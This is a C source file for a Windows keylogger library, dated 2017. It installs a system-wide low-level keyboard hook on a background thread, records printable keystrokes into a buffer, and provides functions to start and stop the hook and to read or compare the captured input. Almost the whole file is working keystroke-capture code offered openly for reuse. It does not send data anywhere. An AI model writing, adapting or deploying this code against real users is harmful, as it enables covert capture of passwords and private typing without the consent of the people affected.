/*******************************************************************************
     The MIT License (MIT)

    Copyright (c) 2017 Gikoskos <georgekoskerid@outlook.com>

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:
    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.
    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
 *********************************************************************************/

#ifndef UNICODE
# define UNICODE 1
#endif //UNICODE

#ifndef _UNICODE
# define _UNICODE 1
#endif //_UNICODE

#include <windows.h>
//uncomment these lines if you're compiling on win8+
//#include <synchapi.h>
//#include <processthreadsapi.h>
#include "WinKeylogger.h"



typedef struct _keystroke_data {
    DWORD virtual_code;
    WCHAR pressed_char;
    BOOL is_printable;
    BOOL key_is_pressed;
    BOOL alt_is_pressed;
} KEYSTROKE;

HHOOK LLKeyboardHook = NULL;
HANDLE hKeyHookThread = NULL, hKillThreadEvent, hKeystrokeEvent;
CRITICAL_SECTION csReadKeystroke;
volatile KEYSTROKE g_keystroke = {.key_is_pressed = FALSE};

static DWORD WINAPI LLKeyboardHookThread(PVOID args);
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM key_state, LPARAM keyhook_data);
static BOOL IsLegalCharacter(DWORD vkCode);


////////////////////////////////////////////////////////////////////
//Functions that log keyboard input and store it in a KEYSTROKE sturct
////////////////////////////////////////////////////////////////////

DWORD WINAPI LLKeyboardHookThread(PVOID args)
{
    UNREFERENCED_PARAMETER(args);
    MSG msg;
    BOOL bRet;

    LLKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!LLKeyboardHook)
        return 1;

    while ((bRet = GetMessage(&msg, NULL, 0, 0))
           && (WaitForSingleObject(hKillThreadEvent, 0) != WAIT_OBJECT_0)) {

        if (bRet == -1)
            break;

        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM key_state, LPARAM keyhook_data)
{
    if (nCode >= 0) {

        EnterCriticalSection(&csReadKeystroke);
        g_keystroke.key_is_pressed = (key_state == WM_KEYDOWN);
        g_keystroke.virtual_code = ((PKBDLLHOOKSTRUCT)keyhook_data)->vkCode;
        g_keystroke.is_printable = IsLegalCharacter(g_keystroke.virtual_code);
        g_keystroke.pressed_char = (WCHAR)MapVirtualKeyW(g_keystroke.virtual_code, MAPVK_VK_TO_CHAR);
        g_keystroke.alt_is_pressed = ((PKBDLLHOOKSTRUCT)keyhook_data)->flags & LLKHF_ALTDOWN;
        LeaveCriticalSection(&csReadKeystroke);

        SetEvent(hKeystrokeEvent);
    }

    return CallNextHookEx(NULL, nCode, key_state, keyhook_data);
}

BOOL IsLegalCharacter(DWORD vkCode)
{
    return (
            (
             (vkCode >= 0x30) //0 key
             &&
             (vkCode <= 0x39) //9 key
            ) //If the character pressed is one of the 0-9 keys
            || //or
            (
             (vkCode >= 0x60) //0 key
             &&
             (vkCode <= 0x6F) //9 key
            ) //If the character pressed is one of the 0-9 on the numeric keypad
            || //or
            (
             (vkCode >= 0x41) //A key
             &&
             (vkCode <= 0x5A) //Z key
            ) //if the character pressed is one of the A-Z keys
            || //or
            (vkCode == VK_SPACE) //if it's the Space key
            || //or
            (vkCode == VK_BACK) //if it's the BackSpace key
            || //or
            (vkCode == VK_RETURN) //if it's the Return key
            || //or
            (vkCode == VK_ESCAPE) //if it's the Escape key
            || //or
            (vkCode == VK_TAB) //if it's the Tab key
           ); //then the character is acceptable by this keylogger.
}

int StartWinKeylogger(void)
{
    InitializeCriticalSection(&csReadKeystroke);

    hKillThreadEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!hKillThreadEvent)
        return FALSE;

    hKeystrokeEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!hKeystrokeEvent)
        return FALSE;

    hKeyHookThread = (HANDLE)CreateThread(NULL, 0, LLKeyboardHookThread, (PVOID)0, 0, NULL);
    if (!hKeyHookThread)
        return FALSE;

    return TRUE;
}

void RemoveWinKeylogger(void)
{
    if (LLKeyboardHook) UnhookWindowsHookEx(LLKeyboardHook);

    if (hKillThreadEvent) {
        SetEvent(hKillThreadEvent);

        //WaitForSingleObject(hKeyHookThread, 5000);

        CloseHandle(hKeyHookThread);
        CloseHandle(hKillThreadEvent);
    }

    DeleteCriticalSection(&csReadKeystroke);
}



//////////////////////////////////////////////////////////////////////////
//Functions for storing the logged input in a buffer and handling the buffer.
//////////////////////////////////////////////////////////////////////////
static WCHAR szInputBuff[WINKEYLOGGER_BUFSIZ] = { 0 };
static size_t curr_idx = 0;

/* returns TRUE if the RETURN key was pressed */
/* optional parameter stores the current index of the buffer */
int LogNextKeystroke(size_t *buff_len)
{
    BOOL bRet = TRUE;
    DWORD dwRes;

    dwRes = WaitForMultipleObjects(2, (HANDLE[]){hKillThreadEvent, hKeystrokeEvent}, FALSE, INFINITE);
    if (dwRes == WAIT_OBJECT_0 || dwRes == WAIT_FAILED) {
        if (buff_len)
            *buff_len = curr_idx;
        return FALSE;
    }

    ResetEvent(hKeystrokeEvent);

    //if the buffer is full, reset the global index back to 0
    if (curr_idx >= WINKEYLOGGER_BUFSIZ - 1) {
        curr_idx = 0;
    }

    EnterCriticalSection(&csReadKeystroke);
    if (g_keystroke.key_is_pressed && g_keystroke.is_printable) {

        switch (g_keystroke.pressed_char) {
            case VK_BACK:
                szInputBuff[curr_idx++] = L'_';
                szInputBuff[curr_idx] = L'\0';
                break;
            case VK_RETURN:
                szInputBuff[curr_idx++] = L' ';
                szInputBuff[curr_idx] = L'\0';
                break;
            case VK_ESCAPE:
                bRet = FALSE;
                break;
            default:
                szInputBuff[curr_idx++] = g_keystroke.pressed_char;
                szInputBuff[curr_idx] = L'\0';
                break;
        }

        g_keystroke.key_is_pressed = FALSE;
    } else {
        LeaveCriticalSection(&csReadKeystroke);
        return LogNextKeystroke(buff_len);
    }
    LeaveCriticalSection(&csReadKeystroke);

    //store the length of the buffer
    if (buff_len) {
        *buff_len = curr_idx;
    }

    return bRet;
}

int StrCmpInputBuffer(WCHAR *szBuff)
{
    int i, z = WINKEYLOGGER_BUFSIZ - 1;

    for (i = 0; (szBuff[i] != L'\0') && (i < z) && (szBuff[i] == szInputBuff[i]); i++);

    return (szBuff[i] == L'\0');
}

void StrCpyLoggedBuffer(WCHAR *szBuff)
{
    if (curr_idx >= WINKEYLOGGER_BUFSIZ - 1)
        RtlCopyMemory((VOID UNALIGNED*)szBuff, (VOID UNALIGNED*)szInputBuff, sizeof szInputBuff);
    else
        RtlCopyMemory((VOID UNALIGNED*)szBuff, (VOID UNALIGNED*)szInputBuff, (curr_idx + 1) * sizeof *szInputBuff);
}
